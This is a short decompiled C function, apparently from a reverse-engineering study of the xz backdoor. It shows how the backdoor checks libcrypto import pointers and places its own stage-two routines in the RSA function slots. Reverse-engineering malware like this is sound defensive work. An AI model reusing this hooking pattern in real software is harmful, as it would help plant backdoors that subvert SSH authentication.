// /home/kali/xzre-ghidra/xzregh/102890_init_imported_funcs.c
// Function: init_imported_funcs @ 0x102890
// Calling convention: __stdcall
// Prototype: BOOL __stdcall init_imported_funcs(imported_funcs_t * imported_funcs)
/*
 * AutoDoc: Verifies the resolved-imports counter and ensures the three critical libcrypto PLT pointers are available, dropping in loader callbacks when they are not. The backdoor uses this guard before enabling the RSA hooks so it never intercepts calls without knowing how to fall back to the genuine routines.
 */

#include "xzre_types.h"


BOOL init_imported_funcs(imported_funcs_t *imported_funcs)

{
  if (imported_funcs->resolved_imports_count == 0x1d) {
    if (imported_funcs->RSA_public_decrypt_plt != (pfn_RSA_public_decrypt_t *)0x0) {
      return 1;
    }
    if (imported_funcs->EVP_PKEY_set1_RSA_plt != (pfn_EVP_PKEY_set1_RSA_t *)0x0) {
      return 1;
    }
    if (imported_funcs->RSA_get0_key_plt != (pfn_RSA_get0_key_t *)0x0) {
      return 1;
    }
    imported_funcs->RSA_public_decrypt_plt = (pfn_RSA_public_decrypt_t *)backdoor_init_stage2;
    imported_funcs->RSA_get0_key_plt = (pfn_RSA_get0_key_t *)init_shared_globals;
  }
  return 0;
}

